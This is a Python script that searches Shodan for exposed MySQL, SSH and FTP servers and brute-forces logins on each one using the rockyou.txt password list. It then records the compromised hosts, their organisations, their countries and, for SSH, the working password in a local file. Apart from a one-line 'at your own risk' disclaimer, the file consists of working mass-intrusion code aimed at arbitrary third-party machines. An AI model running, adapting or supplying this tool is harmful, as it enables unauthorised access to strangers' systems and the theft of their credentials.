from curses import echo
from dataclasses import replace
from doctest import script_from_examples
from itertools import count
from pprint import pprint
from pydbus import connect
from paramiko import SSHClient
from paramiko.ssh_exception import SSHException
from colorama import Fore, Back, Style
from datetime import date
from ftplib import FTP
import ftplib
import socket

# importing the necessary packages
import paramiko
import var_dump
import shodan
import mysql.connector
import time
import sys
import os

# Function for implementing the loading animation
def load_animation():
  
    load_str = "starting your console application...."
    ls_len = len(load_str)
  
    animation = "|/-\\"
    anicount = 0
    counttime = 0        
    i = 0       

    while (counttime != 100):
          
        time.sleep(0.075) 
        load_str_list = list(load_str) 
        x = ord(load_str_list[i])
        y = 0                             

        if x != 32 and x != 46:             
            if x>90:
                y = x-32
            else:
                y = x + 32
            load_str_list[i]= chr(y)
          
        res =''             
        for j in range(ls_len):
            res = res + load_str_list[j]
              
        sys.stdout.write("\r"+res + animation[anicount])
        sys.stdout.flush()
  
        load_str = res
        anicount = (anicount + 1)% 4
        i =(i + 1)% ls_len
        counttime = counttime + 1
      
    # for windows OS
    if os.name =="nt":
        os.system("cls")
    # for linux / Mac OS
    else:
        os.system("clear")
# Driver program
if __name__ == '__main__': 
    sys.stdout.write("Please use this tool at your own risk, do not attempt to violate the law ;)"+"\n")
    print("\n")
load_animation()
print
    # Connect to Shodan
SHODAN_API_KEY = "Your Key"
api = shodan.Shodan(SHODAN_API_KEY)
today = date.today()

input_type = input(Fore.MAGENTA + "What do you want to search for?\n\n1. Vulnerable servers\n\n")
if input_type == "1":
    input_type_server = input(Fore.MAGENTA + "What server do you want to target?\n1. Mysql\n2. Ssh\n3. FTP\n.")
    if input_type_server == "1":
            def searchMysql():  
                try:
                    passlist = open('rockyou.txt', 'r')
                    for password in passlist:
                        for i in range(0, 100):
                            print(Fore.GREEN + "\r[#]Searching for open mysql servers... " + str(i) + "%", end="")
                            time.sleep(0.01)
                        print(Fore.GREEN + "\r[#]Searching for open mysql servers... 100%")
                        time.sleep(1)
                        print("\n")
                        results = api.search('mysql')
                        print('online Mysql servers found: %s' % results['total'])
                        for result in results['matches']:
                            IP = result['ip_str']
                            PORT = result['port']                
                            ORG = result['org']
                            COUNTRY = result['location']['country_name']    
                            print (Fore.YELLOW +"\n[#]Connecting to " + IP[:-4]+"xXx" + ":" + str(PORT) + "...")
                            time.sleep(0.5)
                        #connect to every server in list don't stop if error
                            try:
                                mydb = mysql.connector.connect(
                                    host=IP,
                                    port=PORT,
                                    user='user',
                                    passwd=password.strip()
                                )
                                print("Connected to: " + IP)
                                print("port: " + str(PORT))
                                print("Version: " + mydb
                                .get_server_info())
                                print("\n")
                                if mydb.is_connected():
                                    print("[#]Successfully connected to " + IP[:-4]+"xXx" + ":" + str(PORT) + " with username: root and password: root")
                                    print("[#]Organization: " + ORG)
                                    print("[#]Country: " + COUNTRY)
                                    print("\n")
                                    #write to file
                                    with open("succes_authentications.txt", "a") as myfile:
                                        myfile.write(IP + ":" + str(PORT) + "," + ORG + "," + COUNTRY + "\n")
                                        if mydb.is_connected():
                                            mydb.close()
                                            print("[#]Successfully closed connection to " + IP + ":" + str(PORT))
                                            print("\n")
                                            sys.exit(1)
                                    mydb.close()
                            except mysql.connector.Error as err:
                                print(Fore.RED+"[!]Error connecting to mysql server skipping!: {}".format(err))
                                pass    
                        # var_dump.var_dump(IP, PORT, ORG, COUNTRY)
                except shodan.APIError as e:    
                    print('Error: %s' % e)
                pass


            searchMysql()
    elif input_type_server == "2":
            def searchSsh():
                try:
                    for i in range(0, 100):
                        print(Fore.GREEN + "\r[#]Searching for open ssh servers... " + str(i) + "%", end="")
                        time.sleep(0.01)
                    print(Fore.GREEN + "\r[#]Searching for open ssh servers... 100%")
                    time.sleep(1)
                    print("\n")
                    results = api.search('ssh')
                    print('online ssh servers found: %s' % results['total'])
                    for result in results['matches']:
                        IP_SSH = result['ip_str']
                        PORT_SSH = result['port']                
                        ORG_SSH = result['org']
                        COUNTRY_SSH = result['location']['country_name']   
                        time.sleep(0.5)   
                        #connect to every server in the list don't stop if error
                        print(Fore.YELLOW+"[#]Connecting to: " + IP_SSH[:-4]+"xXx" + ":" + str(PORT_SSH) + " " + COUNTRY_SSH + "...")
                        try:
                            passlist = open('rockyou.txt', 'r')
                            for password in passlist:
                                try:
                                    ssh = SSHClient()
                                    print("\n")
                                    print(Fore.GREEN+"[#]Trying password: " + password.strip())
                                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                                    ssh.banner_timeout = 10
                                    #banner timeout 
                                    ssh.connect(IP_SSH, PORT_SSH, username='root', password=password.strip(), banner_timeout=200 )
                                    
                                    print("[#]Successfully connected to " + IP_SSH[:-4]+"xXx" + ":" + str(PORT_SSH) + " with username: root and password: root")
                                    print("[#]Organization: " + ORG_SSH)
                                    print("[#]Country: " + COUNTRY_SSH)

                                    with open('succes_authentications.txt', 'a') as f:
                                        f.write(IP_SSH + ":" + str(PORT_SSH) + "," + ORG_SSH + "," + COUNTRY_SSH +  "~" + str(today) + password + "\n" + "SSH SERVER" + "\n")
                                    print("saved closing.."+"\n")
                                    if ssh.is_authenticated():
                                        ssh.close()
                                        sys.exit(1)
                                    #skip socket timeout got to next server
                                except socket.timeout:
                                    pass
                                except socket.error:
                                    pass
                                except paramiko.ssh_exception.NoValidConnectionsError:
                                    print(Fore.RED + "[!]Error connecting to ssh server skipping!")
                                    pass
                                # pass every error and print error message
                                except paramiko.ssh_exception.SSHException:
                                    print(Fore.RED +"[!]Error: SSH auth failed for "  + IP_SSH[:-4]+"xXx" + ":" + str(PORT_SSH)+" " + "trying again ...")
                                 #if socket timeout try again
                        except shodan.APIError as e:    
                            print('Error: %s' % e)
                        pass
                except shodan.APIError as e:
                    print('Error: %s' % e)
                pass
            searchSsh()

    elif input_type_server == "3":
        def searchFtp():
            try:
                for i in range(0, 100):
                    print(Fore.GREEN + "\r[#]Searching for open ftp servers... " + str(i) + "%", end="")
                    time.sleep(0.01)
                print(Fore.GREEN + "\r[#]Searching for open ftp servers... 100%")
                time.sleep(1)
                print("\n")
                results = api.search('ftp')
                print('online ftp servers found: %s' % results['total'])
                for result in results['matches']:
                    IP_FTP = result['ip_str']
                    PORT_FTP = result['port']                
                    ORG_FTP = result['org']
                    COUNTRY_FTP = result['location']['country_name'] 
                    print(Fore.YELLOW + "[#]Connecting to: " + IP_FTP[:-4]+"xXx" + ":" + str(PORT_FTP) + " " + COUNTRY_FTP + "...")

                    time.sleep(1)
                    try:
                        passlist = open('rockyou.txt', 'r')
                        for password in passlist:
                            try:
                                ftp = FTP(IP_FTP)
                                print("\n")
                                print(Fore.GREEN+"[#]Trying password: " + password.strip())
                                ftp.login(user='admin', passwd=password.strip())                               
                                print("[#]Successfully connected to " + IP_FTP + ":" + str(PORT_FTP) + " with username: root and passwrd" + password)
                                print("[#]Organization: " + ORG_FTP)
                                print("[#]Country: " + COUNTRY_FTP)
                                with open('succes_authentications.txt', 'a') as f:
                                    f.write(IP_FTP + ":" + str(PORT_FTP) + "," + ORG_FTP + "," + COUNTRY_FTP +  "~" + str(today) + "\n" + "FTP SERVER" + "\n")
                                print("saved closing.."+"\n")
                                if ftp.is_authenticated():
                                    ftp.close()
                                    sys.exit(1)
                            except ftplib.error_perm:
                                print(Fore.RED +"[!]Error: FTP auth failed for " + IP_FTP[:-4]+"xXx" + ":" + str(PORT_FTP)+" " + "trying again...")
                                pass

                    except IOError:
                        print("[!]Error: File not found")
                        pass
            except shodan.APIError as e:
                print('Error: %s' % e)
            pass
        searchFtp()
else:
    print("\n")
    print(Fore.RED + "[!]Invalid input type or range")
    print("\n")
    sys.exit()

